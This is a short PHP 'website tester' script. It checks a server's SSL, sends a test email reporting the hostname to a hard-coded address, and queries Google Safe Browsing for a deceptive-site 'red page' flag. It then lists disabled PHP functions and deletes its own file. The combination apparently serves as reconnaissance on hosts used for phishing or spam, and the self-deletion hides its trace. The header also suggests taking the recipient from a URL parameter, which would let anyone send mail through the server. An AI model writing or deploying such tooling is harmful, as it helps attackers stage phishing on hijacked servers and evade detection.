<?php
/*
  - Author : @tokeichun
  - this is simple website tester to check several testing method (mail function, checking SSL, and Checking if site showing Red Page)
  - change $get_mail value to your own email address!
  - or if you want to change your email each time, you can simply edit it to ( $get_mail = $_GET['mail']; ) // usage = http://xyz.tld/test.php?mail=mail@hosting.com
*/
error_reporting(NULL);
function has_ssl( $domain ) {
    $ssl_check = @fsockopen( 'ssl://' . $domain, 443, $errno, $errstr, 30 );
    $res = !! $ssl_check;
    if ( $ssl_check ) { fclose( $ssl_check ); }
    return $res;
}
if (function_exists('curl_exec')) {
  $url = 'https://'.$_SERVER['SERVER_NAME'].'/';
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_HEADER, true);
  curl_setopt($ch, CURLOPT_NOBODY, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch, CURLOPT_TIMEOUT,10);
  $output = curl_exec($ch);
  $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);

  if ($httpcode == null) {
    print_r('SERVER HTTP | SSL Disabled<br>');
  }
  else {
   print_r('SERVER HTTP(s) | SSL Enabled<br>');
  }
}
elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
  print_r('SERVER HTTP(s) | SSL Enabled<br>');
}
else {
  if (has_ssl($_SERVER['SERVER_NAME']) == null) {
    print_r('SERVER HTTP | SSL Disabled<br>');
  }
  else {
   print_r('SERVER HTTP(s) | SSL Enabled<br>');
  }
}
if(function_exists('mail')){
  $get_mail = "YOUREMAIL@gmail.com";
  $nonce_id = rand();
  $subject = "Result Report Test [".$_SERVER["HTTP_HOST"]."] - ".$nonce_id."";
  $e_message = "".$nonce_id." WORKING !!!";
  mail($get_mail,$subject,$e_message);
  echo "Report ".$nonce_id." Sent to ".$get_mail."<br>";
}
else {
 print_r('mail() function Disabled<br>');
}
$googletrans = file_get_contents("https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=".$_SERVER["HTTP_HOST"]."");
if (preg_match('/2,0,0,1/', $googletrans)) {
    print_r('Domain Deceptive | RED PAGE!<br>');
}
else {
    print_r('Domain Clean | PAGE WORKING!<br>');
}
$ds = @ini_get("disable_functions");
if (!empty($ds)) {
  print_r('Disable Function : '.$ds);}
else {
  print_r('Disable Function : None');
}
unlink(basename($_SERVER['PHP_SELF']));
?>
